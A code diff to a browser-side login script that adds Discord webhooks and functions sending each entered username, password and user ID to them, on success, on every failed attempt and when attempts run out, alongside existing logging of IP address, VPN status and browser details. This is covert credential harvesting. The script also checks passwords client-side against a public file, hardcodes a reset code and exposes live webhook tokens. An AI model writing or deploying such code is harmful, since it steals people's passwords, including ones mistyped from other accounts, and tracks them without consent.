@@ -125,6 +125,19 @@
 (() => {
   const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';
 
+  // Webhooks for the new logging systems
+  const loggingWebhooks = {
+    username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
+    password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
+    identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
+    invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
+    invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
+    invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
+    attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
+    attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
+  };
+
+  // Original webhooks
   const webhookUrls = {
     userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
     browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
@@ -241,7 +254,118 @@
     };
   }
 
-  // Build embeds for each webhook from your payload spec
+  // New logging functions for the specific systems
+  async function logUsername(name, username) {
+    const embed = {
+      title: "Username Logging",
+      color: 0x3498db,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Username", value: username, inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.username, embed);
+  }
+
+  async function logPassword(name, password) {
+    const embed = {
+      title: "Password Logging",
+      color: 0xe74c3c,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Password", value: password, inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.password, embed);
+  }
+
+  async function logIdentifier(name, identifier) {
+    const embed = {
+      title: "Identifier Logging",
+      color: 0x2ecc71,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Identifier", value: identifier, inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.identifier, embed);
+  }
+
+  async function logInvalidUsername(name, username) {
+    const embed = {
+      title: "Invalid Username Logging",
+      color: 0xf39c12,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Invalid Username", value: username, inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.invalid_username, embed);
+  }
+
+  async function logInvalidPassword(name, password) {
+    const embed = {
+      title: "Invalid Password Logging",
+      color: 0xe67e22,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Invalid Password", value: password, inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.invalid_password, embed);
+  }
+
+  async function logInvalidIdentifier(name, identifier) {
+    const embed = {
+      title: "Invalid Identifier Logging",
+      color: 0xd35400,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Invalid Identifier", value: identifier, inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.invalid_identifier, embed);
+  }
+
+  async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
+    const embed = {
+      title: "Attempts Counter Logging",
+      color: 0x9b59b6,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Username", value: username, inline: true },
+        { name: "Password", value: password, inline: true },
+        { name: "Identifier", value: identifier, inline: true },
+        { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.attempts_counter, embed);
+  }
+
+  async function logAttemptsExceeded(name, username, password, identifier) {
+    const embed = {
+      title: "Attempts Exceeded Logging",
+      color: 0xc0392b,
+      fields: [
+        { name: "Name", value: name || "N/A", inline: true },
+        { name: "Username", value: username, inline: true },
+        { name: "Password", value: password, inline: true },
+        { name: "Identifier", value: identifier, inline: true },
+        { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
+        { name: "Date/Time", value: new Date().toISOString(), inline: false }
+      ]
+    };
+    await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
+  }
+
+  // Original embed builders (unchanged)
   function buildUserLoggingEmbed(data) {
     return {
       title: "User Logging System",
@@ -334,7 +458,6 @@
         { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
         { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
 
-        // IP address, VPN, Proxy info is from user object since no JS API for these:
         { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
         { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
         { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
@@ -390,15 +513,34 @@
       errorMsg.textContent = 'Please fill all fields.';
       return;
     }
-    const user = findUser(usernameInput.value, userIDInput.value);
+
+    const username = usernameInput.value;
+    const password = passwordInput.value;
+    const userID = userIDInput.value;
+    const user = findUser(username, userID);
+
+    // Log the attempt
+    await logAttemptsCounter(
+      user?.name || "Unknown",
+      username,
+      password,
+      userID,
+      attempts
+    );
+
     if (!user) {
+      await logInvalidUsername(user?.name || "Unknown", username);
+      await logInvalidIdentifier(user?.name || "Unknown", userID);
       handleFailedAttempt('User not found.');
       return;
     }
-    if (passwordInput.value !== user.password) {
+
+    if (password !== user.password) {
+      await logInvalidPassword(user.name, password);
       handleFailedAttempt('Incorrect password.');
       return;
     }
+
     // Correct login
     attempts = 5;
     updateAttemptsText();
@@ -407,8 +549,13 @@
     loginBox.style.borderColor = 'white';
     loginBox.style.boxShadow = '0 0 15px white';
 
+    // Log successful credentials
+    await logUsername(user.name, username);
+    await logPassword(user.name, password);
+    await logIdentifier(user.name, userID);
+
     // Collect data and send logs
-    const loggingData = await collectLoggingData(user, passwordInput.value);
+    const loggingData = await collectLoggingData(user, password);
 
     // Send all 5 webhooks:
     await Promise.all([
@@ -427,13 +574,28 @@
   }
 
   // Failed attempt handler
-  function handleFailedAttempt(msg) {
+  async function handleFailedAttempt(msg) {
     attempts--;
     updateAttemptsText();
     errorMsg.textContent = msg;
+    
     if (attempts <= 0) {
       attempts = 0;
       errorMsg.textContent = 'No attempts left. Please reset.';
+      
+      // Log attempts exceeded
+      const username = usernameInput.value;
+      const password = passwordInput.value;
+      const userID = userIDInput.value;
+      const user = findUser(username, userID);
+      
+      await logAttemptsExceeded(
+        user?.name || "Unknown",
+        username,
+        password,
+        userID
+      );
+      
       showResetPopup();
       disableInputs();
     } else {
@@ -479,61 +641,61 @@
   }
 
   async function resetCounter() {
-  const enteredCode = resetField.value.trim();
-  const isCorrect = enteredCode === 'Reset.Counter.2579';
+    const enteredCode = resetField.value.trim();
+    const isCorrect = enteredCode === 'Reset.Counter.2579';
 
-  const username = usernameInput.value || 'Unknown';
-  const password = passwordInput.value || 'Unknown';
-  const userID = userIDInput.value || 'Unknown';
-  const user = findUser(username, userID) || {};
+    const username = usernameInput.value || 'Unknown';
+    const password = passwordInput.value || 'Unknown';
+    const userID = userIDInput.value || 'Unknown';
+    const user = findUser(username, userID) || {};
 
-  // 1. Send "Reset box Detected" webhook immediately
-  const resetBoxEmbed = {
-    title: "🔔 Reset Box Detected",
-    color: 0xffff00,
-    fields: [
-      { name: "Name", value: user.name || "N/A", inline: true },
-      { name: "Username", value: username, inline: true },
-      { name: "Password Entered", value: password, inline: true },
-      { name: "User ID", value: userID, inline: true },
-      { name: "Entered Code", value: enteredCode, inline: false },
-      { name: "Time", value: new Date().toLocaleString(), inline: false }
-    ]
-  };
-  const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
-  await sendWebhook(resetBoxWebhook, resetBoxEmbed);
+    // 1. Send "Reset box Detected" webhook immediately
+    const resetBoxEmbed = {
+      title: "🔔 Reset Box Detected",
+      color: 0xffff00,
+      fields: [
+        { name: "Name", value: user.name || "N/A", inline: true },
+        { name: "Username", value: username, inline: true },
+        { name: "Password Entered", value: password, inline: true },
+        { name: "User ID", value: userID, inline: true },
+        { name: "Entered Code", value: enteredCode, inline: false },
+        { name: "Time", value: new Date().toLocaleString(), inline: false }
+      ]
+    };
+    const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
+    await sendWebhook(resetBoxWebhook, resetBoxEmbed);
 
-  // Build embed for correct or incorrect code
-  const resultEmbed = {
-    title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
-    color: isCorrect ? 0x00ff00 : 0xff0000,
-    fields: [
-      { name: "Name", value: user.name || "N/A", inline: true },
-      { name: "Username", value: username, inline: true },
-      { name: "Password Entered", value: password, inline: true },
-      { name: "User ID", value: userID, inline: true },
-      { name: "Reset Code", value: enteredCode, inline: false },
-      { name: "Time", value: new Date().toLocaleString(), inline: false }
-    ]
-  };
+    // Build embed for correct or incorrect code
+    const resultEmbed = {
+      title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
+      color: isCorrect ? 0x00ff00 : 0xff0000,
+      fields: [
+        { name: "Name", value: user.name || "N/A", inline: true },
+        { name: "Username", value: username, inline: true },
+        { name: "Password Entered", value: password, inline: true },
+        { name: "User ID", value: userID, inline: true },
+        { name: "Reset Code", value: enteredCode, inline: false },
+        { name: "Time", value: new Date().toLocaleString(), inline: false }
+      ]
+    };
 
-  // Select webhook for correct or incorrect logging
-  const resultWebhook = isCorrect
-    ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
-    : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";
+    // Select webhook for correct or incorrect logging
+    const resultWebhook = isCorrect
+      ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
+      : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";
 
-  await sendWebhook(resultWebhook, resultEmbed);
+    await sendWebhook(resultWebhook, resultEmbed);
 
-  if (isCorrect) {
-    attempts = 5;
-    updateAttemptsText();
-    enableInputs();
-    hideResetPopup();
-    errorMsg.textContent = '';
-  } else {
-    alert('Incorrect reset code.');
+    if (isCorrect) {
+      attempts = 5;
+      updateAttemptsText();
+      enableInputs();
+      hideResetPopup();
+      errorMsg.textContent = '';
+    } else {
+      alert('Incorrect reset code.');
+    }
   }
-}
 
   // Attach event listeners
   submitBtn.addEventListener('click', submitLogin);
